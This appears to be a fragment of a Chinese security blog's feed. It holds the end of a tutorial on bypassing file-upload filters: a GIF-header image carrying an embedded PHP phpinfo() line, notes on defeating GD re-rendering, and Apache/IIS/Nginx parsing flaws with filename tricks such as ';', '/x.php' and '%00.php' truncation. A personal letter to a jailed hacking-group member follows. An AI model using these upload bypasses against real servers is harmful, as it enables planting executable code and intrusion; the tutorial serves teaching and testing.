src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/09.png" alt="文件上传绕过姿势总结"></p><ul><li>gif文件头</li><li><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/10.png" alt="文件上传绕过姿势总结"></li><li>png文件头</li><li><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/11.png" alt="文件上传绕过姿势总结"></li></ul><h4 id="方式-1"><a href="#方式-1" class="headerlink" title="方式"></a>方式</h4><p>常见图片一句话形式</p><pre><code class="hljs php">GIF89a(...some <span class="hljs-keyword">binary</span> data <span class="hljs-keyword">for</span> image...)<span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>;(... skipping the rest of <span class="hljs-keyword">binary</span> data ...)</code></pre><h3 id="文件加载检测"><a href="#文件加载检测" class="headerlink" title="文件加载检测"></a>文件加载检测</h3><p>这个检测应该是最难绕过的，一般是调用API函数去进行文件加载测试，更有甚者二次渲染</p><h4 id="方式-2"><a href="#方式-2" class="headerlink" title="方式"></a>方式</h4><p>对渲染/加载测试攻击 代码注入绕过<br>对二次渲染攻击 攻击加载器</p><p>代码注入，和文件头的处理方式大致相同不过有了一个限定，你不能破坏这张图片，只能把你要的代码添加在空白区。保持文件结构的完整</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/12.png" alt="文件上传绕过姿势总结"></p><h4 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h4><p>单独列出来这个方式有点特殊<br>我们如果还是上传一个过加载检测的图片</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/13.png" alt="文件上传绕过姿势总结"></p><p>然后再从服务器上下载回本地</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/14.png" alt="文件上传绕过姿势总结"></p><p>并且图片里多了<code>CREATOR: gd-jpeg v1.0 (using IJG JPEG v62)</code><br>说明使用GD php 的gd库</p><p>这里是某后台的调用GD库二次渲染的代码</p><pre><code class="hljs python">function image_gd_open($file, $extension)&#123;$extension = str_replace(<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, $extension);$open_func = <span class="hljs-string">&#x27;imageCreateFrom&#x27;</span>. $extension; //函数名变成 imageCreateFrompng 之类<span class="hljs-keyword">if</span> (!function_exists($open_func))&#123;<span class="hljs-keyword">return</span> FALSE;&#125;<span class="hljs-keyword">return</span> $open_func($file); //变成 imagecreatefrompng(<span class="hljs-string">&#x27;/tmp/php0lbTOn&#x27;</span>)&#125;</code></pre><p>将你上传的文件中属于图片部分的数据抓取出来，再使用自己的API或者函数重新将这张图片生成出来保存在服务端</p><h1 id="0x05-解析攻击"><a href="#0x05-解析攻击" class="headerlink" title="0x05 解析攻击"></a>0x05 解析攻击</h1><h2 id="直接攻击"><a href="#直接攻击" class="headerlink" title="直接攻击"></a>直接攻击</h2><p>直接能上传一个php文件绕过客户端<code>js检测</code>或者<code>服务端MIME检测</code></p><h2 id="配合解析"><a href="#配合解析" class="headerlink" title="配合解析"></a>配合解析</h2><p>先将代码以任意文件形式上传到服务器，通过<code>php文件包含</code><br><code>web服务器解析漏洞.htaccess解析</code>等<br>相互配合达成解析为目标文件类型的攻击</p><h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><ul><li><p>解析：<code>test.php.jkl</code> 并没<code>.jkl</code>后缀的文件，而<code>Apache</code>的某些版本中会直接当成<code>php</code>来解析</p></li><li><p>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</p></li><li><p>对应版本：</p><pre><code class="hljs apache"><span class="hljs-attribute">WampServer2</span>.<span class="hljs-number">0</span> <span class="hljs-literal">All</span> Version (WampServer<span class="hljs-number">2</span>.<span class="hljs-number">0</span>i / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">11</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">WampServer2</span>.<span class="hljs-number">1</span> <span class="hljs-literal">All</span> Version (WampServer<span class="hljs-number">2</span>.<span class="hljs-number">1</span>e-x<span class="hljs-number">32</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">17</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">Wamp5</span> <span class="hljs-literal">All</span> Version (Wamp<span class="hljs-number">5</span>_<span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">4</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">6</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">AppServ</span> <span class="hljs-number">2</span>.<span class="hljs-number">4</span> <span class="hljs-literal">All</span> Version (AppServ - <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">9</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">59</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">AppServ</span> <span class="hljs-number">2</span>.<span class="hljs-number">5</span> <span class="hljs-literal">All</span> Version (AppServ - <span class="hljs-number">2</span>.<span class="hljs-number">5</span>.<span class="hljs-number">10</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">AppServ</span> <span class="hljs-number">2</span>.<span class="hljs-number">6</span> <span class="hljs-literal">All</span> Version (AppServ - <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">0</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>)<span class="hljs-meta"> [Success]</span></code></pre></li></ul><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/15.png" alt="文件上传绕过姿势总结"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/16.png" alt="文件上传绕过姿势总结"></p><h3 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h3><ul><li><p>解析：<code>test.asp/jkl</code>,<code>IIS</code>的某些版本中会直接当成<code>asp</code>来解析;<code>test.asp;jkl</code>,<code>IIS</code>某些版本也会按照<code>asp</code>来解析；<code>任意文件名/任意文件名.php</code>，<code>IIS</code>某些版本会直接当<code>php</code>来解析</p></li><li><p>描述：<code>IIS6.0</code>在解析<code>asp</code>时有两个解析漏洞，一个是如果任意目录名包含<code>.asp</code>字符串，那么这个目录下的所有文件都会按照<code>asp</code>去解析，另一个是文件名中含有<code>asp;</code>就会优先当作<code>asp</code>来解析<br><code>IIS7.0/7.5</code>对php解析有类似<code>Nginx</code>的解析漏洞只要对任意文件名在url后面追加上字符串<code>/任意文件名.php</code>就会按照php去解析</p></li><li><p>对应版本：</p><pre><code class="hljs apache"><span class="hljs-attribute">IIS6</span>.<span class="hljs-number">0</span> (Win<span class="hljs-number">2003</span> SP<span class="hljs-number">2</span> + IIS<span class="hljs-number">6</span>.<span class="hljs-number">0</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">IIS7</span>.<span class="hljs-number">0</span> (Win<span class="hljs-number">2008</span> R<span class="hljs-number">1</span> + IIS<span class="hljs-number">7</span>.<span class="hljs-number">0</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">IIS7</span>.<span class="hljs-number">5</span> (Win<span class="hljs-number">2008</span> R<span class="hljs-number">2</span> + IIS<span class="hljs-number">7</span>.<span class="hljs-number">5</span>)<span class="hljs-meta"> [Success]</span></code></pre></li></ul><ul><li>注意<br><code>任意文件名/任意文件名.php</code>这个漏洞是因为<code>php-cgi</code></li></ul><p><code>IIS6.0</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/17.png" alt="文件上传绕过姿势总结"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/18.png" alt="文件上传绕过姿势总结"></p><p><code>IIS7</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/19.png" alt="文件上传绕过姿势总结"></p><h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h3><ul><li><p>解析：<code>任意文件名/任意文件名.php</code>;<code>任意文件名%00.php</code>都当作php来解析</p></li><li><p>描述：例如原文件名<code>test.jpg</code>但内容包含php一句话添加为<code>test.jpg/x.php</code>来进行解析攻击<br>低版本可以子任意文件名后添加<code>%00.php</code>进行截断攻击</p></li><li><p>对应版本：</p><pre><code class="hljs apache"><span class="hljs-attribute">nginx</span> <span class="hljs-number">0</span>.<span class="hljs-number">5</span>.*<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">nginx</span> <span class="hljs-number">0</span>.<span class="hljs-number">6</span>.*<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">nginx</span> <span class="hljs-number">0</span>.<span class="hljs-number">7</span> &amp;lt;= <span class="hljs-number">0</span>.<span class="hljs-number">7</span>.<span class="hljs-number">65</span><span class="hljs-meta"> [Success]</span><span class="hljs-attribute">nginx</span> <span class="hljs-number">0</span>.<span class="hljs-number">8</span> &amp;lt;= <span class="hljs-number">0</span>.<span class="hljs-number">8</span>.<span class="hljs-number">37</span><span class="hljs-meta"> [Success]</span></code></pre></li></ul><ul><li>注意<br><code>任意文件名/任意文件名.php</code>这个漏洞是因为<code>php-cgi</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/20.png" alt="文件上传绕过姿势总结"></p><h3 id="php-cgi"><a href="#php-cgi" class="headerlink" title="php-cgi"></a>php-cgi</h3><p>这类漏洞主要出现在<code>IIS</code>和<code>Nginx</code>这类以<code>CGI</code>形式调用<code>php</code>的<code>web</code>应用程序<br>而<code>Apache</code>通常是以<code>module</code>的形式去调用<code>php</code>，所以很少出现这个漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/21.png" alt="文件上传绕过姿势总结"><br>可以看到这里实际运行效果是以 <code>cgi.fix_pathinfo = 1</code> 在运行<br>而通常安全意识不高的管理员在安装 <code>IIS+php</code> 或 <code>Nginx+php</code> 的时候都是以默认配置在安装<br>自然这种情况下，这类服务器全都会产生漏洞</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/22.png" alt="文件上传绕过姿势总结"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/23.png" alt="文件上传绕过姿势总结"></p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大风车全体成员写给Bge，只为你有一天可以看到。等你归来</title>
    <link href="/p/63e112c8.html"/>
    <url>/p/63e112c8.html</url>
    
    <content type="html"><![CDATA[<p>这篇文章，我是怀着无比沉重的心情，在键盘上一个字一个字码出来了。和小Y说好了晚上6点就想写了，一直到晚上的9点，我打开word却迟迟下不了手，那种难受不是在写医学论文时候的思虑和斟酌。也不是因为不知道写些什么，而是，想说的话太多了。<br>网易云的音乐在随机播放着，直到播放到，现在很火的那部“法医秦明”的网剧的片尾曲“不灭”，我心中拥堵的言语，仿佛有了疏通的管道，一股脑的的涌了出来。这篇文章，我打算以第二人称来写，只为有一天Bge（化名），你可以看的到。</p><p>今天是你进去的第四个月，请原谅我现在才认真的来抒发我的感情。不知道，你到时候还会不会记得当初我们的“大风车”。我也不清楚你具体进去几年，三年或是五年。我知道可能你的前途就此断送了，我恨，我恨那个矮子狗蛋（化名）。我们将来见不到你的日子，都是他一手造成的。<a id="more"></a>你是真的傻，当初我们有说过他这个人不简单，早些离开他，不要给他“卖命”。你却一味的认为，跟着他能赚到钱。不知道，当你看到这篇文章，回头在想想他，心中会不会后悔没有听我们的话。但是，用几年的时间去明白一个道理，看透一个人，这样的代价真的太大了。</p><p>LC，你知道，我们有多想你吗。一个花季少年，在他最应该奋斗和打拼的年纪，却失去了自由。不知道你是不是还记得，当初的哪一份悸动。从我在渗透吧第一次看到NPLT（化名）这个ID开始，我就和老大说，这小子还不错呀，我对他挺好奇的，感觉是个会钻研技术的人。后来你担任了小吧，也进入了我们“大风车”。我们通过进一步的了解，渐渐的熟了，你和“大师智”也被我们称为两个死基佬。什么，“大师智”是谁？他就是那个“纠结的坏”呀。你还记得为什么“Bge”的这个称号是这么来的吗？当时我和老大在看一个叫小智的英雄联盟（LOL）解说视频时候，因为小智的视频是他和他的一个叫Bge的好朋友一起双排打的，然后我就在群里发了，“Bge”还有“大师智”这两个称号。“纠结的坏”就说其实他就是大师智，然后你就说“我是Bge呀”。从此，我们都开始改口叫你Bge，叫那个傻逼大师智。</p><p>Bge，自从你在网络上没了消息，我们就开始对你进行猜测，没想到当时开玩笑的一句“他不会被查水表，被请去喝茶了吧”，竟然成了真。你空间里的说说被定格在了2016.6.6，还是吃了bsrc送的粽子。我多么希望你能在今时今日发一条说说，呐喊一声“妈的，兄弟们。我回来了”。回忆起以前在一起的时光，我们的交集可能真的不多，交流也是在“大风车”里的扯淡和闲聊，毕竟我的职业和互联网交集太少，渗透或许只是我的兴趣罢了。只是有问题的时候，你都会跟我一通乱扯，我也是一脸懵比，到头来还是老大给我解惑。你说你有什么用，你这渗透吧的小吧当的，群里的秩序也不管管，吧里的垃圾广告帖子也不删一删。还好还有小可爱他们，要不我早就把你的小吧给下了。每每和大师智讨论渗透套路起来，一套一套的，现在大师智都毕业出来，找了一份辣鸡但是很稳定的工作了。我相信要是当时你要是不上了狗蛋这艘贼船，也不会有后来的事情。不过你不用担心，在繁衍下一代的速度上，大师智肯定还是比不上你的，毕竟一个长得和失败试验品似的人，哪有那么快呢，哈哈。</p><p>我不知道当你看到这篇文章的时候是什么样的心情，我早上看到一条消息比较生气。小可爱在我们的“大风车”里发“我这辈子是不可能不日战的，又不会写网站，只能靠日站维持生活，牢里比家里好多了，里面的黑阔们个个都是人才，思路好多了 ，技术也特别棒”我直接把他禁言了30分钟。我平时和他们闹着玩也就是玩玩权限禁言他们三四分钟，这次我真的比较生气，因为我想到了你。谁都知道，对于互联网来说时间意味这什么，不要说几年了，就算是两三个月都可能翻天。就说吧，以前谁能想到乌云这个漏洞提交的圣地会垮台，但是事情就是眼睁睁的发生在了网络中。更为重要的是，自由，对于一个正常人，一个20出头的少年意味着什么。我们不知道你在里面过的怎么样，有没有在深夜暗自悔恨当初。我们能为你做的只剩下闲时想起你的那一份心酸和难受。</p><p>你失去联系的那段时间，我也因为工作的原因自己撤去了渗透吧主的身份，我也就是个副吧主，吧里少了我无关痛痒，反正我也是这么想的。所以渗透吧就剩下了老大一个人在管理，至于后来老大找来了谁谁谁。我就不了解了，也没时间去了解。留给我们的只剩下你在2016.6.6之前的回忆，或许等你回来渗透吧真的就变成了修水管渗透的贴吧了，毕竟现在连我都不愿意踏足那里了。你还记得我那时候闲下来时候，每天深夜给你们更新的恐怖小说《恐录》吗？那时候我也是一时冲动，在下班或则在深夜值班时候没事情做，突发奇想，想蛮写蛮写一本小说。故事的大致纲要和路线都在我的脑子里了，每天闲下来时候都会写上几百字甚至上千，只为了晚上给你们在“大风车”里更新给你们看，你还跟我说“给我安排一个好一点的角色”，我那时候就给你分配了一个保安的身份，后来还死了，哈哈哈。然后在你的恳求之下，我让“你”借尸还魂了，让你当了一个体育频道的主持人。其他人的角色身份也都是我一个一个安插上去的，当时小Y还在高三，看不了。我到了周末都会把一周更新的在全部发一遍出来，为了大伙，特别是“队长”的需求，我再忙，也会有想挤出时间去写这本书的冲动。后来自从你跟了狗蛋，在群里基本上我都看不到你的发言了，渐渐的大家对我的这本书的热情也淡了，加上自己的工作开始进入很忙的一段时间，就断更了。《恐录》这本书也胎死腹中，可能写了还不到一半。你以后要是想看也不会有了，说实话之前的剧情，你敢说不期待？以后你要是想看，说不定我会继续为了你和大伙重新开始规划，来一个《恐录2.0》也不一定哦。</p><p>就在前两天我在知乎上看见了一个帖子“如何评价某某某安全团队的狗蛋”。这是一个匿名用户发出来的，大致的内容呢也就是拔了狗蛋的一些底子。“明面上的讲师，成功人士，年少有位，背地里面的疯狂黑产。出名事实上靠团队，很多文章漏洞，都是他团队里的人发现，他发出来而已。”大致上就是这些扒底的内容，在我看来，或许只有经历过事件的我们才知道到底狗蛋是个怎么样的人。在看到这个帖子的时候，怒的是我们整个“大风车”里的所有人。还在搞这一行的或许都不敢用真实的知乎ID发出自己的声音，都是匿名在该骂的骂该吹的吹。我和队长，两个毅然的站了出来，匿名个屁直接一顿狂喷狗蛋，我们最愤怒的话归纳起来，就呐喊一句“还我Bge！”当然，大肆称赞狗蛋的人一抓一大把，然而他们又知道什么呢。狗蛋自己也发文“所谓的一切喷词，都是那些匿名用户的欲加之罪，都是眼红。”难道，狗蛋自己在发出来的时候就不会有一丝的良心谴责吗。可笑，你今天所谓的成功，所谓的利益，难道不是牺牲了某些人的一切吗。匿名的人在喷狗蛋的人，我在这里替“大风车”和Bge谢谢你们。不管你们是不是知道真相，还是只是凑个热闹，人云亦云的扯上两句，我都要感谢你。而那些继续捧这狗蛋的人，我也不想说什么，如果有一天Bge的事情发生在你的周围，甚至是你的身上。我希望你在多年以后登录上自己的知乎帐号看看自己多年前可笑的言论。在这一刻我，真正的感觉到了鲁迅当时对中国的悲哀，他说“哪怕医学能拯救得了中国人孱弱的体质，也救不了国人麻木的精神。凡是愚弱的国民，即使体格如何健全，如何茁壮，也只能做毫无意义的示众的材料和看客，病死多少是不必以为不幸的。”。即使是在这虚拟的网络中，我也感同身受医学真的救不了国人，为了自己的利益，哪怕牺牲无数人的一切，那有如何。但是又能怎么样呢，我至少拥有良心和责任，我不会放弃继续治愈你们。</p><p>我相信每个人所有经历过的朋友，包括曾经的、未来的、甚至失去的朋友，这一切都是命中注定好了的。和你们一样，回想起Bge和自己的一点点交集，感觉友谊虽然浅薄，但是我们都对彼此的流露过自己最真实的感情。我们一起疯狂过，一起互黑过，才有现在我在写此篇文章时候内心的五味杂陈。“想起那天夕阳下的奔跑，那是我们逝去的青春”，这是大风车的头像里的文字。从你离开到现在，直至以后，我们都不会去更改，因为我们怕你不认得回家的路。在这里还有一群在等待着你回来的伙伴，我们的聊天频道也一直替你留着一个位置。</p><p>啊B，你知道你失联以后我们每次想你都干什么吗。我们会打开你的空间看看你的老照片，继续笑你这个猥琐b，可是这个笑却包含了我们满腔的辛酸。你空间里还保存着一张，也是唯一和队长的合影。那时候的队长相比于现在还开朗很多，不知道是随着时间的更迭，还是你的离开。仿佛一切都在变化，以前在我们看来无比珍重，无比渴望的事情，也在逐渐的消散，唯一不变的就是对你的哪一份念想。老朋友呀，我们无能为力呀，谁都没有想到当时在我们看起来是玩笑话的“查水表”有一天会发生在你的身上，条子也没有让你去喝个茶就回来了。真正应该被砍死的那个狗蛋，现在还在张狂的伪装着。自古说书唱戏劝人方，三条大道走中央。善恶到头终有报，人间正道是沧桑。他以为能这么无限的嚣张下去，踩着别人的未来和自由走向他的利益，开玩笑。</p><p>Bge你生活在我们当中，内心却自有你的一片天地，努力和钻研是你的标签，对未来十分好奇并且怀有憧憬，你从来没有放弃自己过自己的梦想，从你加入渗透吧开始，即使有点偏差，大目标依然都未曾改变过。或许你有很多的人生计划，有对未来生活的安排和渴望，也或许你准备了很多惊喜想提供给我们这些朋友，也想过给自己的家人一份温饱和幸福，可是这一切都还没来的及全部实现，你就在追梦的路上停下了脚步。我们永远都无法知道Bge你内心还有多少曾经设想甚至没来得及吐露的梦。我知道，比我们更加难受的是你的家人。一家人苦苦等待着你能够在完成学业后，假期归来，一家团聚吃顿饭。可是一切美满的进行中却被一个这辈子都被人唾骂的狗蛋所终结。其实，说到底还是你内心对完成梦想的过度渴望被狗蛋利用了。不过，Bge如果你现在看到的话，还是希望你能够重新开始自己新的生活，让你的爱，你的欣喜，淹没痛苦和委屈。在追梦的路上，你始终有我们“大风车”里的小伙伴们的陪同，梦想不会随风而去，他依然把握在你的手上。都说“哭过的眼看岁月更清楚”，我不清楚你在里面是否也曾为了自己暂时搁浅的梦眼角滑落泪水，但是心系你的亲人和朋友肯定为了流过泪。我们不希望，在数年后看到一个坠入深渊的LC，我们坚信来年的春天，花儿依然还会开放，那句迟到的“兄弟们，我Bge又回来了。”始终会来到，只不过来的有点慢，苦了我们这些等待已久的人。</p><p>我写了这么久，虽然还有很多很多的话没有吐露出来，但是以上是我此时最想让你看到的。我们“大风车”永远是一个有爱的团体，你的回归永远不会迟到。他们也有很多想对你说的话，你也知道这些搞技术的并不是每一个都像我一样有写作这个天赋，能将自己的情感通过文字表达出来。但是真的不代表他们没有想法，我让他们尽量开心的表达一下，不要太煽情了。毕竟大家要一起快乐的走下去，不是吗？那么以下就是他们各自想对你说的话，也希望你能够看到。</p><p>首先是“426”听说我要写这么一个关于Bge 的文，他说自己也有想说的，但是憋了半天，才憋了两个字。在他的记忆中，和你聊天第一句话就是“Bge”，“干嘛”，“草泥马”，然后每日成就（1/1）。但是，426 一直强调，你对他有恩。以下是他的原话：不知道是14年还是15年，有幸接触到渗透吧，也有幸加入了渗透吧新手集中营。不知道什么原因，突然被吧主拉入了大风车的群，也不知道这是不是一种缘分，能够跟着里面的各种朋友一起度过了这一年又一年。最开始在里面看见Bge，然而我叫他B哥，是因为他很多很多时候都会发自己正在学的东西到群里面，对于当时的我来说，都很高端，很不可及，所以我叫他B哥。Bge是个很不错的人，挺正直年轻的一个朋友，至少在我看来，他还是一个挺单纯很容易接触的。在刚入群的1年中，总是和B哥他们撕逼，一直到后来，请教过B哥几个问题，B哥也是知无不言，哪怕是很不能泄露的那种也都和我交流过，所以对B哥一直印象不错，毕竟是入群后第一个撕逼开玩笑的人。所以，我真的很想他。</p><p>Bge你猜猜下一个是谁，当然是那个我们的“小可爱”了，很让人高兴的是，现在他终于不是那个臭傻吊了，终于和自己喜欢很久的女神在一起了。不过为了女神的幸福，天天三餐吃饼，也成为了被我们鄙视的笑料。小可爱，在你出事以后真的可能是最不安的了，基本每天都在群里说想你。接下来也是他的原话，我也原封不动的发出来：Bge，NPLT，哈哈，又见面了，我是你的乘客，记不记得你每天给我开车了，我那段时间特别开心的呢！听说Bge的名字还是大姐和老大看直播给你起的呢，从一开始的不认识到老司机的过程是多么美好的一段回忆。我们每天的斗图，互黑，都是那么的美好，记不记得我给你买的细说PHP，我可是看着你从小白变成技术牛的过程，我每天傻不拉几的问你弱智的问题，你还一直给我解答，有什么新的发现也提前告诉我，我多么激动啊！看着你在我电脑上的360之行，多崇拜你。你为人也老实，对大家都挺好的，我曾经多么想和你见一面，现在想想真是后悔以前没见过你，现在暂时也没机会了，不过相信有一天我终究会找到你的，请你去大保健哈哈哈，请你吃大餐，你要好好的，要知道我们都在想你，欢迎你回来一起互黑，小司机在这里等老司机回来开车，等你，等你，等你。。。。</p><p>然后是“iceH”，或许Bge你对他的印象是停留在这小子手机上有抢红包外挂，每次有人发红包，无论什么时间，他总是第一个抢到，然后屁都不放一个。但是他和你一样，都是一个懂奋斗，爱钻研都年轻小伙。在得知你的消息以后，也曾牵肠挂肚，也有一肚子的话想对你说：关于Bge吧，在我的映像中是个很逗而且乐于帮助他人的人。记得那时候刚进大风车，有许多问题的时候，问他的时候，他总是会很有耐心的帮忙解决。前段时间听说你进去了，起初我也没在意，以为你是有事没办法上QQ了。但渐渐的，发现你不发言了，也不装逼了，QQ达人也灭了，这个时候我开始慌了。每次看到大师智，就会想起你。愿你早日回归我们大风车这个家庭，我们全体成员等你回来。        </p><p>下一个是我们的“表姐”拉，最近她正在为了制作她的光立方和激光电子琴而绞尽脑汁呢。说起表姐，一个很喜欢写工具，动手能力十足，很有想法的小青年。你是否还记得她博客里自己制作的小游戏2048中还有你头像的小方块呢，你对应的是2048中的32，每次合成到32就能再次看到你那个装b 的头像了。表姐爱动漫，所以她的头像都是一些我也搞不清是什么的动漫角色，但是打开她的博客，你会发现，这扑面而来的还TM的还是动漫角色呀。不过这次我认识，那是可爱并且文武双全的土间埋，小埋（《干物妹！小埋》女主）。一个在家总是披着仓鼠斗篷，二头身，懒惰，任性的熊孩子形象。不过是个性格温柔并且头脑很好，无可挑剔的美少女高中生。Bge，你说实话，想不想找一个这样的女朋友……好了，接下来是表姐想对你说的原话哦：在我印象中，Bge是一个很逗逼又很爱装逼的人，在我知识浅薄的时候帮助我很多，也帮助过大风车很多人，在Bge那我学到了很多渗透知识（现在大多都忘了，2333~），我非常感谢Bge对我的帮助，很怀念Bge装逼的样子，告诉Bge表姐想他。我们在等你回来！</p><p>我们的个人showtime大告白怎么能少了你的好基友“大师智”呢。这个坏小子，现在已经在某某某公司上班了，然而dog改不了吃屎，还是会在上班时间干点其他的屁事。“纠结的坏”这个名字曾经一度成为我们黑他的一个点，到底他在初中年少时候有多么的非主流才能起一个这样子骚气的名字，不得不说他年少时候一定有很多段不堪回首的往事。你们在一起搞事情的日子发生点点点滴滴或许也只有你们彼此懂，就让往事随风而去吧。Bge我知道你好强，没事，大师智这小子到现在还是单身呢，你那么帅分分钟撩一个哪有什么问题。好了，下面是他给你的原话：Bge嘛，嘿嘿嘿。我依然还记得那个中午，临上课前帮Bge提权的事，记得上面有狗，加不上账户，只能修改密码了。不过厚道的我当然没有这么做了，只是把方法告诉了碧哥。从此我们也就一起坐上了友谊的小船。还有就是开语音的时候，那一口“标准”的普通话，用四川话来说，你就是个蛤蟆皮。再然后，就是那段时间，好几次直播被打脸，233333.最后的最后，许久不见，不知你可好，我永远一直都会在大风车等你！</p><p>还记得那个身处高中牢笼之中，依然在周末捣腾他钟爱都渗透的小